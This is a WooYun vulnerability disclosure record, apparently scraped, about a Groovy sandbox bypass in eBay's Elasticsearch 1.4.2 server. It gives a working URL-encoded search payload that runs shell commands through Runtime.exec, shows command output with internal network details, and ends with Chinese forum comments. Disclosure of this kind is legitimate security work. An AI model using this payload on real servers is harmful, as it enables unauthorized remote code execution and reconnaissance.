{"id": 66589, "wybug_id": "wooyun-2015-0149512", "wybug_title": "eBay Search Scripting Engine Remote Code Execution (Bypass firewall)", "wybug_corp": "eBay Inc.", "wybug_author": "猪猪侠", "wybug_date": "2015-10-26 11:15", "wybug_open_date": "2015-10-31 11:16", "wybug_type": "命令执行", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["第三方框架"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-10-26：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-10-31：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： eBay Search Scripting Engine Remote Code Execution (Bypass firewall) 详细说明：  #1 DESCRIPTION\nElasticsearch Groovy Scripting Engine Sandbox Security Bypass Vulnerabilityhttp://www.securityfocus.com/bid/72585https://www.elastic.co/blog/elasticsearch-1-4-3-and-1-3-8-released\n#2 VULNERABILITYhttp://mips-lb02.ebayc3.com/\n{  \"status\" : 200,  \"name\" : \"mips-master\",  \"cluster_name\" : \"mips.db\",  \"version\" : {    \"number\" : \"1.4.2\",    \"build_hash\" : \"927caff6f05403e936c20bf4529f144f0c89fd8c\",    \"build_timestamp\" : \"2014-12-16T14:11:12Z\",    \"build_snapshot\" : false,    \"lucene_version\" : \"4.10.2\"  },  \"tagline\" : \"You Know, for Search\"}\n   漏洞证明：  #3 PROOF OF CONCEPT\nhttp://mips-lb02.ebayc3.com/_search?source=%7B%22size%22%3A1%2C%22script_fields%22%3A%20%7B%22iswin%22%3A%20%7B%22script%22%3A%22java.lang.Math.class.forName%28%5C%22java.io.BufferedReader%5C%22%29.getConstructor%28java.io.Reader.class%29.newInstance%28java.lang.Math.class.forName%28%5C%22java.io.InputStreamReader%5C%22%29.getConstructor%28java.io.InputStream.class%29.newInstance%28java.lang.Math.class.forName%28%5C%22java.lang.Runtime%5C%22%29.getRuntime%28%29.exec%28%5C%22netstat%20-an%5C%22%29.getInputStream%28%29%29%29.readLines%28%29%22%2C%22lang%22%3A%20%22groovy%22%7D%7D%7D\n\n\n/sbin/ifconfig -a\n{\"took\":242,\"timed_out\":false,\"_shards\":{\"total\":69,\"successful\":69,\"failed\":0},\"hits\":{\"total\":321,\"max_score\":1.0,\"hits\":[{\"_index\":\"mips\",\"_type\":\"items\",\"_id\":\"rpp_54c01345e4b076e493788bf5_141165380495\",\"_score\":1.0,\"fields\":{\"iswin\":[[\"eth0      Link encap:Ethernet  HWaddr 74:DB:D1:A0:02:08  \",\"          inet addr:10.65.187.29  Bcast:10.65.187.255  Mask:255.255.255.0\",\"          inet6 addr: fe80::76db:d1ff:fea0:208/64 Scope:Link\",\"          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1\",\"          RX packets:139625117 errors:0 dropped:0 overruns:0 frame:0\",\"          TX packets:72122815 errors:0 dropped:0 overruns:0 carrier:0\",\"          collisions:0 txqueuelen:1000 \",\"          RX bytes:12956581403 (12.0 GiB)  TX bytes:9237711324 (8.6 GiB)\",\"\",\"lo        Link encap:Local Loopback  \",\"          inet addr:127.0.0.1  Mask:255.0.0.0\",\"          inet6 addr: ::1/128 Scope:Host\",\"          UP LOOPBACK RUNNING  MTU:16436  Metric:1\",\"          RX packets:100756 errors:0 dropped:0 overruns:0 frame:0\",\"          TX packets:100756 errors:0 dropped:0 overruns:0 carrier:0\",\"          collisions:0 txqueuelen:0 \",\"          RX bytes:5241172 (4.9 MiB)  TX bytes:5241172 (4.9 MiB)\",\"\"]]}}]}}\n   修复方案：  # updatehttps://www.elastic.co/blog/elasticsearch-1-4-3-and-1-3-8-released   版权声明：转载请注明来源 猪猪侠@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2015-10-31 11:16 厂商回复：  漏洞Rank：15  (WooYun评价) 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-10-26 11:16 |    \t\t残冰 \t\t\t( 普通白帽子  |\t\t\t        Rank:185 漏洞数:27        | 专业爆破5000000000000000000000年)\t\t \n  板凳    \n     2015-10-26 11:20 |    \t\t梨花带雨 \t\t\t( 普通白帽子  |\t\t\t        Rank:165 漏洞数:55        | 去年今日此门中，人面桃花相映红。人面不...)\t\t \n  2楼    \n     2015-10-26 11:24 |    \t\tHerolon \t\t\t( 普通白帽子  |\t\t\t        Rank:191 漏洞数:43        | ******)\t\t \n  国际化？    \n     2015-10-26 11:25 |    \t\tboooooom  \t\t\t( 普通白帽子  |\t\t\t        Rank:467 漏洞数:50        | 我有一个好想法！)\t\t \n  惊呆了，这个也可以搞到啊，万万没想到。    \n     2015-10-26 11:41 |    \t\tHackPanda \t\t\t( 普通白帽子  |\t\t\t        Rank:113 漏洞数:15        | Talk is cheap,show me the shell.)\t\t \n  RCE --     \n     2015-10-26 11:42 |    \t\thecate \t\t\t( 普通白帽子  |\t\t\t        Rank:379 漏洞数:63        | ®高级安全工程师 | WooYun认证√)\t\t \n  Good job    \n     2015-10-26 11:59 |    \t\tzeracker  \t\t\t( 普通白帽子  |\t\t\t        Rank:1068 漏洞数:137        | 多乌云、多机会!微信公众号: id:a301zls   ...)\t\t \n  高逼格    \n     2015-10-26 12:48 |    \t\tscanf \t\t\t( 核心白帽子 |\t\t\t        Rank:1307 漏洞数:191        | 。)\t\t \n  走国际化的路了    \n     2015-10-26 12:55 |    \t\tphith0n  \t\t\t( 核心白帽子 |\t\t\t        Rank:662 漏洞数:108        | 一个想当文人的黑客~)\t\t \n  国际猪    \n     2015-10-26 12:59 |    \t\t路人毛 \t\t\t( 实习白帽子  |\t\t\t        Rank:48 漏洞数:15        | 呵呵)\t\t \n  现在引进了一只国际猪    \n     2015-10-26 13:28 |    \t\tzhiher \t\t\t( 路人 |\t\t\t        Rank:16 漏洞数:4        )\t\t \n  走国际化的路了    \n     2015-10-26 13:45 |    \t\t随风的风 \t\t\t( 普通白帽子  |\t\t\t        Rank:131 漏洞数:48        | [code]时光如水，总是无言，你若安好，便是...)\t\t \n  现在引进了一只国际猪    \n     2015-10-26 14:05 |    \t\t炯炯虾 \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:1        | 我来自地球)\t\t \n  @路人毛  International pig    \n     2015-10-26 14:30 |    \t\tBeenQuiver \t\t\t( 普通白帽子  |\t\t\t        Rank:101 漏洞数:26        | 专注而高效，坚持好的习惯千万不要放弃)\t\t \n  仰视仰视我们屯里的羊    \n     2015-10-26 14:42 |    \t\t岛云首席鉴黄师 \t\t\t( 普通白帽子  |\t\t\t        Rank:211 漏洞数:70        | 妈妈，我要上电视)\t\t \n  无间道片场，梁朝伟正坐着休息。刘德华想出去，但觉得梁朝伟有些挡路，于是对他说：“卧底，劳驾。”梁朝伟头也没抬接着唱道：“就住在这个屯。”    \n     2015-10-26 15:07 |    \t\tgreg.wu \t\t\t( 普通白帽子  |\t\t\t        Rank:862 漏洞数:103        | 打酱油的~)\t\t \n  是不是elastic search的rce？    \n     2015-10-26 17:09 |    \t\tQ1NG \t\t\t( 普通白帽子  |\t\t\t        Rank:101 漏洞数:20        | 临 兵 斗 者 皆 阵 列 前 行 !)\t\t \n  好高端!    \n     2015-10-27 08:49 |    \t\t鬼魅羊羔 \t\t\t( 普通白帽子  |\t\t\t        Rank:299 漏洞数:42        | (#‵′)凸(#‵′)凸(#‵′)凸(#‵′)凸(#‵...)\t\t \n  我猜，猪哥肯定不只是标题国际化了。。。要是内容详情也国际化了，公开和不公开、核心白帽子和普通白帽子就没什么区别了。。因为都看不懂。。。    \n     2015-10-27 09:13 |    \t\th3hz \t\t\t( 路人 |\t\t\t        Rank:30 漏洞数:3        )\t\t \n  标题就够劲爆，不知道啥时候公开    \n     2015-10-27 11:01 |    \t\teBay Inc.(乌云厂商)\t\t \n  猪猪侠您好，非常感谢您提供的漏洞报告！我们系统管理员正在审核该漏洞，我们会尽快回复。    \n     2015-10-27 11:04 |    \t\t猪猪侠  \t\t\t( 核心白帽子 |\t\t\t        Rank:3572 漏洞数:275        | 你都有那么多超级棒棒糖了，还要自由干吗？)\t\t \n  @eBay Inc. 作为国际厂商，你讲中文，我们很不习惯。    \n     2015-10-27 13:03 |    \t\t天朝城管 \t\t\t( 普通白帽子  |\t\t\t        Rank:116 漏洞数:35        | 不要等到命玩你的时候才开始玩命)\t\t \n  @猪猪侠 猪哥 这个b装的我给满分    \n     2015-10-27 16:37 |    \t\txsser_w \t\t\t( 普通白帽子  |\t\t\t        Rank:116 漏洞数:34        | 哎)\t\t \n  @猪猪侠 nice to meet you ,GG bond, how are you ,Im fine,thank you ,and you? we are very glad to recive your report on serious risks in our system,our guys are now analysing your issues,we will reply as soon as we could    \n     2015-10-31 11:27 |    \t\tk0_pwn \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:2        | 专注二进制许多年，突然觉得web才好玩)\t\t \n  2015-10-31：\t厂商已经主动忽略漏洞，细节向公众公开    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}